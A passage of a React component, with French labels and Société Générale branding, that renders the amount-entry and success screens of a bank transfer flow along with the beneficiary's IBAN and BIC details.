                onClick={() => setCurrentPage('list')}
                className="flex-1 bg-gray-300 text-gray-700 py-3 rounded font-semibold hover:bg-gray-400 transition"
              >
                Annuler
              </button>
              <button
                onClick={handleAddBeneficiary}
                className="flex-1 bg-red-600 text-white py-3 rounded font-semibold hover:bg-red-700 transition"
              >
                Valider
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (currentPage === 'amount') {
    return (
      <div className="min-h-screen bg-white flex flex-col">
        <div className="fixed top-0 left-0 right-0 bg-gray-100 py-3 flex justify-center border-b z-50">
          <img 
            src="images/logo sg.jpg" 
            alt="Société Générale" 
            className="h-12 object-contain"
          />
        </div>

        <div className="pt-20 px-4 py-6 flex justify-center">
          <div className="w-full max-w-md">
            <h2 className="text-xl font-bold text-gray-900 mb-6 text-center">Montant du virement</h2>
            
            <div className="mb-6">
              <h3 className="text-sm font-semibold text-gray-700 mb-2 text-center">Bénéficiaire</h3>
              <div className="bg-gray-50 border border-gray-300 rounded p-3">
                <div className="font-semibold mb-1 text-center">{selectedBeneficiary?.prenom} {selectedBeneficiary?.nom}</div>
                <div className="text-gray-600 text-sm text-center">{selectedBeneficiary?.iban}</div>
              </div>
            </div>

            <div className="mb-6">
              <h3 className="text-sm font-semibold text-gray-700 mb-2 text-center">Montant</h3>
              <div className="flex justify-center">
                <div className="relative w-64">
                  <input 
                    type="number"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    className="w-full border-2 border-gray-300 rounded px-3 py-2 text-xl font-semibold text-center pr-10"
                    placeholder="0.00"
                    step="0.01"
                  />
                  <span className="absolute right-3 top-1/2 transform -translate-y-1/2 text-xl font-semibold text-gray-600">€</span>
                </div>
              </div>
              <div className="text-sm text-gray-600 mt-2 text-center">
                Solde disponible: {soldeCompte.toLocaleString('fr-FR', { minimumFractionDigits: 2 })} €
              </div>
            </div>

            <div className="flex gap-3 mt-8">
              <button
                onClick={() => setCurrentPage('list')}
                className="flex-1 bg-gray-300 text-gray-700 py-3 rounded font-semibold hover:bg-gray-400 transition"
              >
                Retour
              </button>
              <button
                onClick={handleConfirmAmount}
                className="flex-1 bg-red-600 text-white py-3 rounded font-semibold hover:bg-red-700 transition"
              >
                Confirmer
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (currentPage === 'success') {
    return (
      <div className="min-h-screen bg-white flex flex-col">
        <div className="fixed top-0 left-0 right-0 bg-gray-100 py-3 flex justify-center border-b z-50">
          <img 
            src="images/logo sg.jpg" 
            alt="Société Générale" 
            className="h-12 object-contain"
          />
        </div>

        <div className="pt-20 px-4 py-6 flex flex-col items-center justify-center min-h-[calc(100vh-80px)]">
          <CheckCircle className="w-24 h-24 text-green-500 mb-6" />
          <h2 className="text-2xl font-bold text-gray-900 mb-4">Virement initié avec succès !</h2>
          <p className="text-gray-600 text-center mb-2">Votre virement a été créé.</p>
          
          <div className="bg-gray-50 border border-gray-300 rounded p-4 w-full max-w-md mb-8">
            <div className="flex justify-between mb-2">
              <span className="text-gray-600">Bénéficiaire:</span>
              <span className="font-semibold">{selectedBeneficiary?.prenom} {selectedBeneficiary?.nom}</span>
            </div>

              <div className="flex justify-between mb-2">
          <span className="text-gray-600">IBAN:</span>
         <span className="font-semibold text-sm">{selectedBeneficiary?.iban}</span>
       </div>
       <div className="flex justify-between mb-2">
       <span className="text-gray-600">BIC:</span>
        <span className="font-semibold">{selectedBeneficiary?.bic}</span>
      </div>
            <div className="flex justify-between mb-2">
              <span className="text-gray-600">Montant:</span>
              <span className="font-semibold">{parseFloat(amount).toLocaleString('fr-FR', { minimumFractionDigits: 2 })} €</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">Nouveau solde:</span>
              <span className="font-semibold">{(soldeCompte).toLocaleString('fr-FR', { minimumFractionDigits: 2 })} €</span>
            </div>
          </div>

          <button
            onClick={handleBackToList}
            className="bg-red-600 text-white py-3 px-8 rounded font-semibold hover:bg-red-700 transition"
          >
            Retour à l'accueil
          </button>
        </div>
      </div>
    );
  }

  return null;
}